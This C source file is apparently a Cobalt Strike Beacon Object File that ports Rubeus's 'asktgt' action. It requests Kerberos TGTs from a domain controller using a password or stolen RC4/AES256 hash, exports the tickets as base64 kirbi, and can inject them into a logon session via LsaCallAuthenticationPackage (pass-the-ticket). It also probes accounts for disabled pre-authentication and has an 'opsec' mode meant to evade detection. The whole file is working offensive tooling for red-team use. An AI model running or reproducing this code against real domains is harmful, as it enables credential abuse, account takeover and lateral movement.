#include "_include/asn_decode.c"
#include "_include/asn_encode.c"
#include "_include/crypt_b64.c"
#include "_include/crypt_dec.c"
#include "_include/crypt_key.c"
#include "_include/connection.c"

HANDLE GetCurrentToken(DWORD DesiredAccess) {
    HANDLE hCurrentToken = NULL;
    if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), DesiredAccess, FALSE, &hCurrentToken))
        if (hCurrentToken == NULL && KERNEL32$GetLastError() == ERROR_NO_TOKEN)
            if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), DesiredAccess, &hCurrentToken))
                return NULL;
    return hCurrentToken;
}

LUID GetCurrentLUID(HANDLE TokenHandle) {
    TOKEN_STATISTICS tokenStats;
    DWORD tokenSize;
    if (!ADVAPI32$GetTokenInformation(TokenHandle, TokenStatistics, &tokenStats, sizeof(tokenStats), &tokenSize))
        return (LUID) { 0 };
    return tokenStats.AuthenticationId;
}

BOOL IsSystem(HANDLE TokenHandle) {
    UCHAR bTokenUser[sizeof(TOKEN_USER) + 8 + 4 * SID_MAX_SUB_AUTHORITIES];
    PTOKEN_USER pTokenUser = (PTOKEN_USER)bTokenUser;
    ULONG cbTokenUser;
    SID_IDENTIFIER_AUTHORITY siaNT = SECURITY_NT_AUTHORITY;
    PSID pSystemSid = NULL;
    BOOL bSystem = FALSE;

    // Try to open the token of the current thread first
    if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), TOKEN_QUERY, TRUE, &TokenHandle)) {
        // If there is no thread token, fall back to the process token
        if (KERNEL32$GetLastError() == ERROR_NO_TOKEN) {
            if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &TokenHandle)) {
                return FALSE;
            }
        } else {
            return FALSE;
        }
    }

    if (!ADVAPI32$GetTokenInformation(TokenHandle, TokenUser, pTokenUser, sizeof(bTokenUser), &cbTokenUser)) {
        return FALSE;
    }

    if (!ADVAPI32$AllocateAndInitializeSid(&siaNT, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid)) {
        return FALSE;
    }

    bSystem = ADVAPI32$EqualSid(pTokenUser->User.Sid, pSystemSid);

    ADVAPI32$FreeSid(pSystemSid);

    return bSystem;
}

BOOL GetLsaHandle(HANDLE hToken, BOOL highIntegrity, HANDLE* hLsa) {
    HANDLE hLsaLocal = NULL;
    ULONG  mode = 0;
    bool   status = true;
    if (highIntegrity) {
        STRING lsaString = (STRING){ .Length = 8, .MaximumLength = 9, .Buffer = "Winlogon" };
        status = SECUR32$LsaRegisterLogonProcess(&lsaString, &hLsaLocal, &mode);
    }
    else {
        status = SECUR32$LsaConnectUntrusted(&hLsaLocal);
    }
    *hLsa = hLsaLocal;
    return status;
}

int my_isdigit(int c) {
    return (c >= '0' && c <= '9');
}

int my_islower(int c) {
    return (c >= 'a' && c <= 'z');
}

long int my_strtol(const char* str, char** endptr, int base) {
    long int result = 0;
    int sign = 1;

    if (*str == '-' || *str == '+') {
        sign = (*str == '-') ? -1 : 1;
        str++;
    }

    while (my_isdigit(*str) ||
           (base == 16 && (*str >= 'a' && *str <= 'f')) ||
           (base == 16 && (*str >= 'A' && *str <= 'F'))) {
        int digit = 0;
        if (my_isdigit(*str)) {
            digit = *str - '0';
        }
        else if (base == 16) {
            digit = (my_islower(*str) ? (*str - 'a' + 10) : (*str - 'A' + 10));
        }

        if (digit >= base)
            break;

        if (result > (LONG_MAX - digit) / base) {
            if (sign == 1)
                return LONG_MAX;
            else
                return LONG_MIN;
        }

        result = result * base + digit;
        str++;
    }

    if (endptr != NULL)
        *endptr = (char*)str;

    return result * sign;
}

void PTT(char* luid, byte* ticket) {
    HANDLE hToken = GetCurrentToken(TOKEN_QUERY);
    LUID   currentLuid = GetCurrentLUID(hToken);
    LUID   targetLuid = { 0 };
    bool   IsHighIntegrity = IsSystem(hToken);

    if (luid) {
        targetLuid.LowPart = my_strtol(luid, NULL, 16);
        if (targetLuid.LowPart == 0 || targetLuid.LowPart == LONG_MAX || targetLuid.LowPart == LONG_MIN) {
            PRINT_OUT("[x] Invalid luid\n");
            return;
        }
    }
    else {
        targetLuid = currentLuid;
    }

    if (!IsHighIntegrity && currentLuid.LowPart != targetLuid.LowPart) {
        PRINT_OUT("[X] You need to be in SYSTEM integrity.\n");
        return;
    }

    if (currentLuid.LowPart != targetLuid.LowPart)
        IsHighIntegrity = false;

    HANDLE hLsa;
    if (GetLsaHandle(hToken, IsHighIntegrity, &hLsa)) return;

    ULONG authPackage;
    LSA_STRING krbAuth = { .Buffer = "kerberos",.Length = 8,.MaximumLength = 9 };
    if (SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage) == 0) {

        int decode_ticket_size = 0;
        byte* decode_ticket = base64_decode(ticket, &decode_ticket_size);

        int submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + decode_ticket_size;
        KERB_SUBMIT_TKT_REQUEST* submitRequest = MemAlloc(submitSize);

        submitRequest->MessageType = KerbSubmitTicketMessage;
        submitRequest->KerbCredSize = decode_ticket_size;
        submitRequest->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
        if (IsHighIntegrity)
            submitRequest->LogonId = targetLuid;
        else
            submitRequest->LogonId = (LUID){ 0 };

        MemCpy((PBYTE)submitRequest + submitRequest->KerbCredOffset, decode_ticket, decode_ticket_size);

        NTSTATUS protocolStatus = 0;
        ULONG    responseSize = 0;
        void* response = 0;
        if (SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, submitRequest, submitSize, &response, &responseSize, &protocolStatus) || protocolStatus)
            PRINT_OUT("\n[X] Ticket not imported.\n");
        else
            PRINT_OUT("\n[+] Ticket successfully imported.\n");
    }
    SECUR32$LsaDeregisterLogonProcess(hLsa);
}



BOOL NewAS_REP(AsnElt asn_AS_REP, AS_REP* as_rep) {
    // AS-REP::= [APPLICATION 11] KDC-REQ
    if ((asn_AS_REP.subCount != 1) || (asn_AS_REP.sub[0].tagValue != 16)) {
        PRINT_OUT("First AS-REP sub should be a sequence");
        return TRUE;
    }

    AsnElt* kdc_rep = asn_AS_REP.sub[0].sub;

    for (int i = 0; i < asn_AS_REP.sub[0].subCount; i++) {
        int tagValue = kdc_rep[i].tagValue;
        if ( tagValue == 0 ) {
            if (AsnGetInteger(&(kdc_rep[i].sub[0]), &(as_rep->pvno))) return TRUE;
        }
        if ( tagValue == 1 ) {
            if (AsnGetInteger(&(kdc_rep[i].sub[0]), &(as_rep->msg_type)))return TRUE;
        }
        if ( tagValue == 2 ) {
            as_rep->pa_data_count = kdc_rep[i].subCount;
            as_rep->pa_data = MemAlloc(as_rep->pa_data_count);
            for (int j = 0; j < as_rep->pa_data_count; j++) {
                PA_DATA padata = { 0 };
                if (AsnGetPaData(&(kdc_rep[i].sub[j].sub[0]), &padata)) return TRUE;
                as_rep->pa_data[j] = padata;
            }
        }
        if ( tagValue == 3 ) {
                if (AsnGetString(&(kdc_rep[i].sub[0]), &(as_rep->crealm))) return TRUE;
        }
        if ( tagValue == 4 ) {
                if (AsnGetPrincipalName(&(kdc_rep[i].sub[0]), &(as_rep->cname))) return TRUE;
        }
        if ( tagValue == 5 ) {
            if (kdc_rep[i].sub[0].subCount)
                if (AsnGetTicket(&(kdc_rep[i].sub[0].sub[0]), &(as_rep->ticket))) return TRUE;
        }
        if ( tagValue == 6 ) {
            if (AsnGetEncryptedData(&(kdc_rep[i].sub[0]), &(as_rep->enc_part))) return TRUE;
        }
    }
    kdc_rep = NULL;
    return FALSE;
}

BOOL HandleASREP(AsnElt responseAsn, EncryptionKey encKey, byte* serviceKey, BOOL getCredentials, byte* dcIP, byte** ticket) {
    AS_REP as_rep = { 0 };
    if (NewAS_REP(responseAsn, &as_rep)) return TRUE;

    byte* key = NULL;
    size_t keySize;
    byte* result;
    size_t resultSize;
    key = encKey.key_value;
    if (as_rep.enc_part.etype != encKey.key_type) {
        PRINT_OUT("[!] Warning: Supplied encyption key type but AS-REP contains data encrypted");
        return TRUE;
    }

    int key_usage = 0;
    if (as_rep.enc_part.etype == aes128_cts_hmac_sha1 || as_rep.enc_part.etype == aes256_cts_hmac_sha1) {
        key_usage = 3;
    }
    else if (as_rep.enc_part.etype == rc4_hmac || as_rep.enc_part.etype == des_cbc_md5) {
        key_usage = 8;
    }
    else {
        PRINT_OUT("[X] Encryption type \"%d\" not currently supported", as_rep.enc_part.etype);
        return TRUE;
    }

    if (decrypt(key, encKey.key_type, key_usage, as_rep.enc_part.cipher, as_rep.enc_part.cipher_size, &result, &resultSize))return TRUE;

    AsnElt ae = { 0 };
    if (BytesToAsnDecode(result, resultSize, &ae)) return TRUE;
    if (ae.tagValue != 25) {
        PRINT_OUT("[X] Failed to decrypt TGT using supplied password/hash. If this TGT was requested with no preauth then the password supplied may be incorrect or the data was encrypted with a different type of encryption than expected");
        return TRUE;
    }

    EncKDCRepPart encRepPart = { 0 };
    if (AsnGetEncKDCRepPart(&(ae.sub[0]), &encRepPart)) return TRUE;

    KRB_CRED cred = { 0 };
    cred.pvno = 5;
    cred.msg_type = 22;
    cred.ticket_count = 1;
    cred.tickets = MemAlloc(sizeof(Ticket) * cred.ticket_count);
    cred.tickets[0] = as_rep.ticket;

    KrbCredInfo info = { 0 };
    info.key = encRepPart.key;
    info.flags = encRepPart.flags;
    info.starttime = encRepPart.starttime;
    info.endtime = encRepPart.endtime;
    info.renew_till = encRepPart.renew_till;
    info.pname = as_rep.cname;
    info.sname = encRepPart.sname;

    my_copybuf(&(info.prealm), encRepPart.realm, my_strlen(encRepPart.realm) + 1);
    my_copybuf(&(info.srealm), encRepPart.realm, my_strlen(encRepPart.realm) + 1);

    cred.enc_part.ticket_count = 1;
    cred.enc_part.ticket_info = MemAlloc(sizeof(KrbCredInfo) * cred.enc_part.ticket_count);
    cred.enc_part.ticket_info[0] = info;

    AsnElt asnKirbi = { 0 };
    if (AsnKrbCredEncode(&cred, &asnKirbi)) return TRUE;

    int kirbiBytesSize = 0;
    byte* kirbiBytes = 0;
    if (AsnToBytesEncode(&asnKirbi, &kirbiBytesSize, &kirbiBytes)) return TRUE;

    *ticket = base64_encode(kirbiBytes, kirbiBytesSize);
    return FALSE;
}

BOOL NewAS_REQ( char* pcUsername, char* pcDomain, EncryptionKey encKey, BOOL opsec, BOOL bPac, BOOL is_nopreauth, char* service, AS_REQ* as_req ) {
    BOOL status = FALSE;

    as_req->pvno = 5;
    as_req->msg_type = KERB_AS_REQ;

    as_req->req_body.kdc_options = FORWARDABLE | RENEWABLE | RENEWABLEOK;
    as_req->req_body.till = 1 * 3600;   // valid for 1h
    ADVAPI32$SystemFunction036(&(as_req->req_body.nonce), 4);
    if (my_copybuf(&as_req->req_body.realm, pcDomain, my_strlen(pcDomain) + 1)) return TRUE;

    as_req->req_body.cname.name_type = PRINCIPAL_NT_PRINCIPAL;
    as_req->req_body.cname.name_count = 1;
    as_req->req_body.cname.name_string = MemAlloc(sizeof(void*) * as_req->req_body.cname.name_count);
    if (!as_req->req_body.cname.name_string) {
        PRINT_OUT("[x] Failed alloc memory");
        return TRUE;
    }
    if (my_copybuf(&(as_req->req_body.cname.name_string[0]), pcUsername, my_strlen(pcUsername) + 1)) return TRUE;

    if (service) {

        int partsCount = 1;
        int index = 0;
        while (service[index]) {
            if (service[index] == '/')
                partsCount++;
            index++;
        }

        as_req->req_body.sname.name_count  = partsCount;
        as_req->req_body.sname.name_string = MemAlloc(sizeof(void*) * as_req->req_body.cname.name_count);
        as_req->req_body.sname.name_type   = PRINCIPAL_NT_PRINCIPAL;

        int partIndex = 0;
        int startIndex = 0;
        index = 0;
        while (service[index] && partIndex < partsCount) {
            if (service[index] == '/') {
                if (my_copybuf(&(as_req->req_body.sname.name_string[partIndex]), service + startIndex, index + 1 - startIndex)) return TRUE;
                as_req->req_body.sname.name_string[partIndex][index] = 0;
                startIndex = index + 1;
                partIndex++;
            }
            index++;
        }
        if (my_copybuf(&(as_req->req_body.sname.name_string[partIndex]), service + startIndex, index + 1 - startIndex)) return TRUE;
    }
    else {
        as_req->req_body.sname.name_count = 2;
        as_req->req_body.sname.name_string = MemAlloc(sizeof(void*) * as_req->req_body.cname.name_count);
        as_req->req_body.sname.name_type = PRINCIPAL_NT_SRV_INST;
        if (my_copybuf(&(as_req->req_body.sname.name_string[0]), "krbtgt", 7)) return TRUE;
        if (my_copybuf(&(as_req->req_body.sname.name_string[1]), pcDomain, my_strlen(pcDomain) + 1)) return TRUE;
    }

    int pa_index = 0;
    if (is_nopreauth) {
        as_req->pa_data_count = 1;
        as_req->pa_data = MemAlloc(sizeof(PA_DATA) * as_req->pa_data_count);
        if (!as_req->pa_data) {
            PRINT_OUT("[x] Failed alloc memory");
            return TRUE;
        }
    }
    else {
        as_req->pa_data_count = 2;
        as_req->pa_data = MemAlloc(sizeof(PA_DATA) * as_req->pa_data_count);
        if (!as_req->pa_data) {
            PRINT_OUT("[x] Failed alloc memory");
            return TRUE;
        }
        if (AsnEncTimeStampToPaDataEncode(encKey, &(as_req->pa_data[0]))) return TRUE;
        pa_index++;
    }
    as_req->pa_data[pa_index].type = PADATA_PA_PAC_REQUEST;
    as_req->pa_data[pa_index].value = MemAlloc(sizeof(KERB_PA_PAC_REQUEST));
    if (!as_req->pa_data[pa_index].value) {
        PRINT_OUT("[x] Failed alloc memory");
        return TRUE;
    }
    ((KERB_PA_PAC_REQUEST*)as_req->pa_data[pa_index].value)->include_pac = bPac;

    if (opsec) {
        as_req->req_body.rtime = 1 * 3600;   // valid for 1h
        as_req->req_body.kdc_options |= CANONICALIZE;

        as_req->req_body.etypes_count = 6;
        as_req->req_body.etypes = MemAlloc(sizeof(int) * as_req->req_body.etypes_count);
        if (!as_req->req_body.etypes) {
            PRINT_OUT("[x] Failed alloc memory");
            return TRUE;
        }
        as_req->req_body.etypes[0] = aes256_cts_hmac_sha1;
        as_req->req_body.etypes[1] = aes128_cts_hmac_sha1;
        as_req->req_body.etypes[2] = rc4_hmac;
        as_req->req_body.etypes[3] = rc4_hmac_exp;
        as_req->req_body.etypes[4] = old_exp;
        as_req->req_body.etypes[5] = des_cbc_md5;

        as_req->req_body.addresses_count = 1;
        as_req->req_body.addresses = MemAlloc(as_req->req_body.addresses_count * sizeof(HostAddress));
        if (!as_req->req_body.addresses) {
            PRINT_OUT("[x] Failed alloc memory");
            return TRUE;
        }

        int size = MAX_COMPUTERNAME_LENGTH + 2;
        char* hostname = MemAlloc(size);
        if (!hostname) {
            PRINT_OUT("[x] Failed alloc memory");
            return TRUE;
        }
        KERNEL32$GetComputerNameA(hostname, &size);
        int numSpaces = 8 - (size % 8);
        int i = 0;
        for (; i < numSpaces; i++)
            hostname[size + i] = ' ';
        hostname[size + i] = 0;

        as_req->req_body.addresses[0].addr_type = ADDRTYPE_NETBIOS;
        as_req->req_body.addresses[0].addr_string = hostname;
    }
    else {
        as_req->req_body.etypes_count = 1;
        as_req->req_body.etypes = MemAlloc(sizeof(int) * as_req->req_body.etypes_count);
        if (!as_req->req_body.etypes) {
            PRINT_OUT("[x] Failed alloc memory");
            return TRUE;
        }
        as_req->req_body.etypes[0] = encKey.key_type;
    }

    return FALSE;
}

BOOL CreateEncKey(char* domain, char* user, char* password, int currentEtype, int encType, EncryptionKey* encKey) {
    if (currentEtype == 0) {
        if (encType == rc4_hmac) {
            encKey->key_type = rc4_hmac;
            return get_key_rc4(password, &(encKey->key_value), &(encKey->key_size));
        }
        else if (encType == aes256_cts_hmac_sha1) {
            encKey->key_type = aes256_cts_hmac_sha1;
            return get_key_aes256(domain, user, password, &(encKey->key_value), &(encKey->key_size));
        }
        else {
            encKey->key_type = rc4_hmac;
            return get_key_rc4(password, &(encKey->key_value), &(encKey->key_size));
        }
    }
    else {
        encKey->key_type = encType;
        encKey->key_size = my_strlen(password) / 2;
        if (((encType == rc4_hmac) && (encKey->key_size == 16)) || ((encType == aes256_cts_hmac_sha1) && (encKey->key_size == 32))) {
            encKey->key_value = MemAlloc(encKey->key_size);
            for (int i = 0, j = 0; j < encKey->key_size; i += 2, j++)
                encKey->key_value[j] = (password[i] % 32 + 9) % 25 * 16 + (password[i + 1] % 32 + 9) % 25;
            return FALSE;
        }
    }
    return TRUE;
}

BOOL NoPreAuthTGT(char* user, char* domain, EncryptionKey encKey, char* domainController, BOOL describe, BOOL verbose, BOOL ptt, BOOL* ret) {

    AS_REQ NoPreAuthASREQ = { 0 };
    if (NewAS_REQ(user, domain, encKey, TRUE, TRUE, TRUE, NULL, &NoPreAuthASREQ)) return TRUE;

    AsnElt requestAsn = { 0 };
    if (ReqToAsnEncode(NoPreAuthASREQ, 10, &requestAsn)) return TRUE;

    int bRequestAsnSize = 0;
    byte* bRequestAsn = 0;
    if (AsnToBytesEncode(&requestAsn, &bRequestAsnSize, &bRequestAsn)) return TRUE;

    byte* response = NULL;
    int responseSize = 0;
    sendBytes(domainController, "88", bRequestAsn, bRequestAsnSize, &response, &responseSize);

    if (responseSize == 0) {
        *ret = FALSE;
        return TRUE;
    }

    AsnElt responseAsn = { 0 };
    if (BytesToAsnDecode(response, responseSize, &responseAsn)) return TRUE;

    if (responseAsn.tagValue == KERB_AS_REP) {
        if (verbose)
            PRINT_OUT("[-] AS-REQ w/o preauth successful! %s has pre-authentication disabled!\n", user);

        if (encKey.key_value > 0) {
            byte* kirbiBytes = NULL;
            if (HandleASREP(responseAsn, encKey, NULL, FALSE, domainController, &kirbiBytes)) return TRUE;
            *ret = TRUE;
            if (ptt)
                PTT(NULL, kirbiBytes);
        }
    }
    else if (responseAsn.tagValue == KERB_ERROR) {
        uint error_code = 0;
        if (AsnGetErrorCode(&(responseAsn.sub[0]), &error_code)) return TRUE;
        if (error_code == 0x19) { // KDC_ERR_PREAUTH_REQUIRED
            if (verbose)
                PRINT_OUT("[!] Pre-Authentication required!\n");
        }
        *ret = FALSE;
    }
    else {
        *ret = TRUE;
        return TRUE;
    }

    return FALSE;
}

BOOL AskTGT_hash(char* user, char* domain, char* password, int currentEtype, int encType, BOOL opsec, BOOL pac, BOOL describe, BOOL ptt, char* dc, byte** kirbiBytes) {
    EncryptionKey encKey = { 0 };
    if (CreateEncKey(domain, user, password, currentEtype, encType, &encKey)) return TRUE;

    BOOL preauth = FALSE;
    if (opsec)
        if (NoPreAuthTGT(user, domain, encKey, dc, describe, TRUE, ptt, &preauth)) return TRUE;

    if (!preauth) {
        PRINT_OUT("[*] Building AS-REQ (w/ preauth) for: '%s\\%s'\n", domain, user);

        AS_REQ userHashASREQ = { 0 };
        if (NewAS_REQ(user, domain, encKey, opsec, pac, FALSE, NULL, &userHashASREQ)) return TRUE;

        AsnElt requestAsn = { 0 };
        if (ReqToAsnEncode(userHashASREQ, 10, &requestAsn)) return TRUE;

        int bRequestAsnSize = 0;
        byte* bRequestAsn = 0;
        if (AsnToBytesEncode(&requestAsn, &bRequestAsnSize, &bRequestAsn)) return TRUE;

        byte* response = NULL;
        int responseSize = 0;
        sendBytes(dc, "88", bRequestAsn, bRequestAsnSize, &response, &responseSize);
        if (responseSize == 0)
            return TRUE;

        AsnElt responseAsn = { 0 };
        if (BytesToAsnDecode(response, responseSize, &responseAsn))return TRUE;

        if (responseAsn.tagValue == KERB_AS_REP) {
            if (HandleASREP(responseAsn, encKey, NULL, FALSE, dc, kirbiBytes)) return TRUE;
            if (describe) {
                PRINT_OUT("[+] TGT request successful!\n");
                PRINT_OUT("[*] base64(ticket.kirbi): \n\n%s\n\n", *kirbiBytes);
            }
            if (ptt)
                PTT(NULL, *kirbiBytes);
        }
        else if (responseAsn.tagValue == KERB_ERROR) {
            uint error_code = 0;
            if (AsnGetErrorCode(&(responseAsn.sub[0]), &error_code)) return TRUE;
            PRINT_OUT("\n\t[x] Kerberos error : %d\n", error_code);
//            PRINT_OUT("\n\t[x] Kerberos error : %s\n", lookupKrbErrorCode(error_code));
        }
        else {
            PRINT_OUT("\n[X] Unknown application tag: %d\n", responseAsn.tagValue);
        }
    }
    return FALSE;
}

void ASK_TGT_RUN( PCHAR Buffer, DWORD Length ) {
    PRINT_OUT("[*] Action: Ask TGT\n\n");

    char* user      = NULL;
    char* domain    = NULL;
    char* dc        = NULL;
    char* password  = NULL;
    char* s_enctype = NULL;
    char* cert      = NULL;
    char* hash      = NULL;
    int   encType   = subkey_keymaterial;
    int   curEType  = 0;
    BOOL  ptt       = FALSE;
    BOOL  opsec     = FALSE;
    BOOL  pac       = FALSE;
    BOOL  nopreauth = FALSE;

    for (int i = 0; i < Length; i++) {
        i += GetStrParam(Buffer + i, Length - i, "/user:", 6, &user );
        i += GetStrParam(Buffer + i, Length - i, "/domain:", 8, &domain );
        i += GetStrParam(Buffer + i, Length - i, "/password:", 10, &password );
        i += GetStrParam(Buffer + i, Length - i, "/dc:", 4, &dc );
        i += GetStrParam(Buffer + i, Length - i, "/enctype:", 9, &s_enctype );
        i += IsSetParam(Buffer + i, Length - i, "/ptt", 4, &ptt );
        i += IsSetParam(Buffer + i, Length - i, "/opsec", 6, &opsec );
        i += IsSetParam(Buffer + i, Length - i, "/nopac", 6, &pac );
        i += IsSetParam(Buffer + i, Length - i, "/nopreauth", 10, &nopreauth );
        int h1 = GetStrParam(Buffer + i, Length - i, "/rc4:", 5, &hash );
        if(h1){
            encType = rc4_hmac;
            curEType = encType;
        }
        int h2 = GetStrParam(Buffer + i, Length - i, "/aes256:", 8, &hash );
        if(h2){
            encType = aes256_cts_hmac_sha1;
            curEType = encType;
        }
    }
    pac = !pac;

    if(password)
        encType = rc4_hmac;

    if( s_enctype ) {
        if (my_strcmp(s_enctype, "rc4") == 0)
            encType = rc4_hmac;
        else if (my_strcmp(s_enctype, "aes256") == 0)
            encType = aes256_cts_hmac_sha1;
    }

    GetDomainInfo(&domain, &dc);
    if (domain == NULL || dc == NULL) {
        PRINT_OUT("[X] Could not retrieve domain information!\n\n");
        return;
    }

    if (user == NULL) {
        PRINT_OUT("[X] You must supply a user name!\n\n");
        return;
    }

    if (((hash || password) == NULL) && (cert == NULL) && !nopreauth) {
        PRINT_OUT("[X] You must supply a /password, /certificate or a [ /rc4 | /aes256 ] hash!\n\n");
        return;
    }

    if (!password && hash)
        password = hash;

    if (!(encType == rc4_hmac || encType == aes256_cts_hmac_sha1) && !nopreauth) {
        PRINT_OUT("[X] Only /rc4 and /aes256 are supported.\n\n");
        return;
    }
    else {
        if (opsec && encType != aes256_cts_hmac_sha1) {
            PRINT_OUT("[X] Using /opsec but not using /enctype:aes256\n");
            return;
        }

        byte* ticket = NULL;
        if (nopreauth) {
            EncryptionKey encKey = { 0 };
            encKey.key_type = encType;
            BOOL ret = FALSE;
            if (NoPreAuthTGT(user, domain, encKey, dc, TRUE, TRUE, ptt, &ret)) return;
        }
        else if (cert) {
            //PRINT_OUT("Ask.TGT(user, domain, certificate);\n");
        }
        else {
            AskTGT_hash(user, domain, password, curEType, encType, opsec, pac, TRUE, ptt, dc, &ticket);
        }
    }
}

VOID go( IN PCHAR Buffer, IN ULONG Length ) {
    INIT_BOF();

    datap parser;
    BeaconDataParse(&parser, Buffer, Length);
    DWORD PARAM_SIZE = 0;
    PBYTE PARAM = BeaconDataExtract(&parser, &PARAM_SIZE);

    if( LoadFunc() )
        PRINT_OUT("%s\n", "Modules not loaded");
    else
        ASK_TGT_RUN( PARAM, PARAM_SIZE );

    FreeBank();

    END_BOF();
}
